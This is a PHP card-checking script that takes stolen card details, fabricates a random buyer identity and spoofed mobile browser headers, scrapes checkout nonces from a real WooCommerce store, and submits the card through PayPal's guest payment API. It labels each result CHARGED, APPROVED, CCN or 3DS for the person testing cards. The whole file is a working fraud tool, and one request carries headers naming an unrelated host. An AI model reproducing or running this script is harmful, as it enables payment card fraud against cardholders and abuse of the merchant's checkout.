<?php
header('Content-Type: application/json');

// Enable error reporting for debugging (disable in production)
ini_set('display_errors', 0);
error_log("PayPal 1$ check initiated");

session_start();
if (!isset($_SESSION['user']) || $_SESSION['user']['auth_provider'] !== 'telegram') {
    error_log("Unauthorized access attempt to paypal1$.php");
    echo json_encode(['status' => 'error', 'message' => 'Unauthorized']);
    exit;
}

// Parse card data from POST request
$data = json_decode(file_get_contents('php://input'), true);
if (!$data || !isset($data['card']['number'], $data['card']['exp_month'], $data['card']['exp_year'], $data['card']['cvc'])) {
    error_log("Invalid card data received: " . json_encode($data));
    echo json_encode(['status' => 'error', 'message' => 'Invalid card data']);
    exit;
}

$card = [
    'number' => $data['card']['number'],
    'exp_month' => str_pad($data['card']['exp_month'], 2, '0', STR_PAD_LEFT),
    'exp_year' => substr($data['card']['exp_year'], -2),
    'cvc' => $data['card']['cvc'],
    'displayCard' => implode('|', [$data['card']['number'], $data['card']['exp_month'], $data['card']['exp_year'], $data['card']['cvc']])
];

// Generate random user data
$first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", "Hannah"];
$last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki"];
$first_name = $first_names[array_rand($first_names)];
$last_name = $last_names[array_rand($last_names)];
$cities = ["New York", "Los Angeles", "Chicago"];
$states = ["NY", "CA", "IL"];
$city = $cities[array_rand($cities)];
$state = $states[array_rand($states)];
$street_address = rand(1, 999) . " Main St";
$zip_code = "10080"; // Using a fixed zip for simplicity
$email = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"), 0, 10) . "@gmail.com";
$phone = "303" . rand(1000000, 9999999);

// User agent generation
$user_agents = [
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
];
$user = $user_agents[array_rand($user_agents)];

// Session and button session IDs
$lol1 = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"), 0, 10);
$lol2 = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"), 0, 10);
$lol3 = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"), 0, 11);
$session_id = "uid_{$lol1}_{$lol3}";
$button_session_id = "uid_{$lol2}_{$lol3}";

// Initial requests to set up session
$ch = curl_init();
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 30); // Reduced timeout to handle faster checks
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // For testing, disable in production

// Step 1: Add to cart
curl_setopt($ch, CURLOPT_URL, 'https://switchupcb.com/shop/i-buy/');
curl_setopt($ch, CURLOPT_POST, true);
$fields = [
    'quantity' => '1',
    'add-to-cart' => '4451'
];
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($fields));
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: switchupcb.com',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://switchupcb.com',
    'referer: https://switchupcb.com/shop/i-buy/',
    'sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'user-agent: ' . $user
]);
$response = curl_exec($ch);
if (curl_errno($ch)) {
    error_log("Curl error in add to cart: " . curl_error($ch));
    echo json_encode(['status' => 'DECLINED', 'message' => 'REQUEST FAILED: timeout (HTTP 0)', 'response' => $card['displayCard']]);
    curl_close($ch);
    exit;
}

// Step 2: Checkout page
curl_setopt($ch, CURLOPT_URL, 'https://switchupcb.com/checkout/');
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: switchupcb.com',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'referer: https://switchupcb.com/cart/',
    'sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'user-agent: ' . $user
]);
$response = curl_exec($ch);
if (curl_errno($ch)) {
    error_log("Curl error in checkout: " . curl_error($ch));
    echo json_encode(['status' => 'DECLINED', 'message' => 'REQUEST FAILED: timeout (HTTP 0)', 'response' => $card['displayCard']]);
    curl_close($ch);
    exit;
}

$sec = '';
$nonce = '';
$check = '';
$create = '';
preg_match('/update_order_review_nonce":"(.*?)"/', $response, $sec_match);
if (isset($sec_match[1])) $sec = $sec_match[1];
preg_match('/save_checkout_form.*?nonce":"(.*?)"/', $response, $nonce_match);
if (isset($nonce_match[1])) $nonce = $nonce_match[1];
preg_match('/name="woocommerce-process-checkout-nonce" value="(.*?)"/', $response, $check_match);
if (isset($check_match[1])) $check = $check_match[1];
preg_match('/create_order.*?nonce":"(.*?)"/', $response, $create_match);
if (isset($create_match[1])) $create = $create_match[1];

if (empty($sec) || empty($nonce) || empty($check) || empty($create)) {
    error_log("Failed to extract nonces: sec=$sec, nonce=$nonce, check=$check, create=$create");
    echo json_encode(['status' => 'DECLINED', 'message' => 'REQUEST FAILED: missing nonces', 'response' => $card['displayCard']]);
    curl_close($ch);
    exit;
}

// Step 3: Update order review
curl_setopt($ch, CURLOPT_URL, 'https://switchupcb.com/?wc-ajax=update_order_review');
curl_setopt($ch, CURLOPT_POST, true);
$data = "security=$sec&payment_method=ppcp-gateway&country=US&state=$state&postcode=$zip_code&city=$city&address=$street_address&address_2=&s_country=US&s_state=$state&s_postcode=$zip_code&s_city=$city&s_address=$street_address&s_address_2=&has_full_address=true&post_data=billing_first_name=$first_name&billing_last_name=$last_name&billing_email=$email&billing_phone=$phone&woocommerce-process-checkout-nonce=$check&_wp_http_referer=/";
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: switchupcb.com',
    'accept: */*',
    'accept-language: ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://switchupcb.com',
    'referer: https://switchupcb.com/checkout/',
    'sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'user-agent: ' . $user
]);
$response = curl_exec($ch);
if (curl_errno($ch)) {
    error_log("Curl error in update order review: " . curl_error($ch));
    echo json_encode(['status' => 'DECLINED', 'message' => 'REQUEST FAILED: timeout (HTTP 0)', 'response' => $card['displayCard']]);
    curl_close($ch);
    exit;
}

// Step 4: Create order
curl_setopt($ch, CURLOPT_URL, 'https://switchupcb.com/?wc-ajax=ppc-create-order');
curl_setopt($ch, CURLOPT_POST, true);
$json_data = json_encode([
    'nonce' => $create,
    'payer' => null,
    'bn_code' => 'Woo_PPCP',
    'context' => 'checkout',
    'order_id' => '0',
    'payment_method' => 'ppcp-gateway',
    'funding_source' => 'card',
    'form_encoded' => "billing_first_name=$first_name&billing_last_name=$last_name&billing_email=$email&billing_phone=$phone&billing_country=US&billing_address_1=$street_address&billing_city=$city&billing_state=$state&billing_postcode=$zip_code&woocommerce-process-checkout-nonce=$check&payment_method=ppcp-gateway&terms=on",
    'createaccount' => false,
    'save_payment_method' => false
]);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: switchupcb.com',
    'accept: */*',
    'accept-language: en-US,en;q=0.9',
    'content-type: application/json',
    'origin: https://switchupcb.com',
    'referer: https://switchupcb.com/checkout/',
    'sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'user-agent: ' . $user
]);
$response = curl_exec($ch);
if (curl_errno($ch)) {
    error_log("Curl error in create order: " . curl_error($ch));
    echo json_encode(['status' => 'DECLINED', 'message' => 'REQUEST FAILED: timeout (HTTP 0)', 'response' => $card['displayCard']]);
    curl_close($ch);
    exit;
}

$result = json_decode($response, true);
if (json_last_error() !== JSON_ERROR_NONE) {
    error_log("JSON decode error in create order: " . json_last_error_msg());
    echo json_encode(['status' => 'DECLINED', 'message' => 'REQUEST FAILED: invalid response', 'response' => $card['displayCard']]);
    curl_close($ch);
    exit;
}

$id = $result['data']['id'] ?? '';
$pcp = $result['data']['custom_id'] ?? '';

if (empty($id) || empty($pcp)) {
    error_log("Failed to get order ID or custom ID: id=$id, pcp=$pcp");
    echo json_encode(['status' => 'DECLINED', 'message' => 'REQUEST FAILED: order creation failed', 'response' => $card['displayCard']]);
    curl_close($ch);
    exit;
}

// Step 5: PayPal card fields
curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/smart/card-fields');
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.paypal.com',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'referer: https://www.paypal.com/smart/buttons?client-id=AY7TjJuH5RtvCuEf2ZgEVKs3quu69UggsCg29lkrb3kvsdGcX2ljKidYXXHPParmnymd9JacfRh0hzEp&currency=USD&intent=capture',
    'sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'user-agent: ' . $user
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'sessionID' => $session_id,
    'buttonSessionID' => $button_session_id,
    'locale.x' => 'ar_EG',
    'commit' => 'true',
    'hasShippingCallback' => 'false',
    'env' => 'production',
    'country.x' => 'EG',
    'token' => $id
]));
$response = curl_exec($ch);
if (curl_errno($ch)) {
    error_log("Curl error in PayPal card fields: " . curl_error($ch));
    echo json_encode(['status' => 'DECLINED', 'message' => 'REQUEST FAILED: timeout (HTTP 0)', 'response' => $card['displayCard']]);
    curl_close($ch);
    exit;
}

// Step 6: Submit payment
curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/graphql?fetch_credit_form_submit');
curl_setopt($ch, CURLOPT_POST, true);
$json_data = json_encode([
    'query' => "\n        mutation payWithCard(\n            \$token: String!\n            \$card: CardInput!\n            \$phoneNumber: String\n            \$firstName: String\n            \$lastName: String\n            \$shippingAddress: AddressInput\n            \$billingAddress: AddressInput\n            \$email: String\n            \$currencyConversionType: CheckoutCurrencyConversionType\n            \$installmentTerm: Int\n            \$identityDocument: IdentityDocumentInput\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: \$token\n                card: \$card\n                phoneNumber: \$phoneNumber\n                firstName: \$firstName\n                lastName: \$lastName\n                email: \$email\n                shippingAddress: \$shippingAddress\n                billingAddress: \$billingAddress\n                currencyConversionType: \$currencyConversionType\n                installmentTerm: \$installmentTerm\n                identityDocument: \$identityDocument\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ",
    'variables' => [
        'token' => $id,
        'card' => [
            'cardNumber' => $card['number'],
            'type' => 'VISA',
            'expirationDate' => $card['exp_month'] . '/20' . $card['exp_year'],
            'postalCode' => $zip_code,
            'securityCode' => $card['cvc'],
        ],
        'firstName' => $first_name,
        'lastName' => $last_name,
        'billingAddress' => [
            'givenName' => $first_name,
            'familyName' => $last_name,
            'line1' => $street_address,
            'city' => $city,
            'state' => $state,
            'postalCode' => $zip_code,
            'country' => 'US',
        ],
        'email' => $email,
        'currencyConversionType' => 'VENDOR',
    ]
]);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: my.tinyinstaller.top',
    'accept: */*',
    'accept-language: ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'content-type: application/json',
    'origin: https://my.tinyinstaller.top',
    'referer: https://my.tinyinstaller.top/checkout/',
    'sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'user-agent: ' . $user
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
$response = curl_exec($ch);
if (curl_errno($ch)) {
    error_log("Curl error in payment submission: " . curl_error($ch));
    echo json_encode(['status' => 'DECLINED', 'message' => 'REQUEST FAILED: timeout (HTTP 0)', 'response' => $card['displayCard']]);
    curl_close($ch);
    exit;
}

$result = json_decode($response, true);
if (json_last_error() !== JSON_ERROR_NONE) {
    error_log("JSON decode error in payment response: " . json_last_error_msg());
    echo json_encode(['status' => 'DECLINED', 'message' => 'REQUEST FAILED: invalid response', 'response' => $card['displayCard']]);
    curl_close($ch);
    exit;
}

$code = $result['errors'][0]['code'] ?? '';
$message = $result['errors'][0]['message'] ?? '';

if (isset($result['data']['approveGuestPaymentWithCreditCard']['flags']['is3DSecureRequired']) && $result['data']['approveGuestPaymentWithCreditCard']['flags']['is3DSecureRequired']) {
    echo json_encode(['status' => '3DS', 'message' => 'OTP! - 3D', 'response' => $card['displayCard']]);
} elseif (strpos($message, 'INVALID_SECURITY_CODE') !== false) {
    echo json_encode(['status' => 'CCN', 'message' => 'Approved! - Ccn', 'response' => $card['displayCard']]);
} elseif (strpos($message, 'EXISTING_ACCOUNT_RESTRICTED') !== false) {
    echo json_encode(['status' => 'APPROVED', 'message' => 'Approved! - AVS', 'response' => $card['displayCard']]);
} elseif (strpos($message, 'INVALID_BILLING_ADDRESS') !== false) {
    echo json_encode(['status' => 'APPROVED', 'message' => 'Approved! - Invalid Address', 'response' => $card['displayCard']]);
} elseif (strpos($response, 'succeeded') !== false) {
    echo json_encode(['status' => 'CHARGED', 'message' => 'Charged!', 'response' => $card['displayCard']]);
} else {
    echo json_encode(['status' => 'DECLINED', 'message' => "REQUEST FAILED: $code ($message)", 'response' => $card['displayCard']]);
}

curl_close($ch);
?>
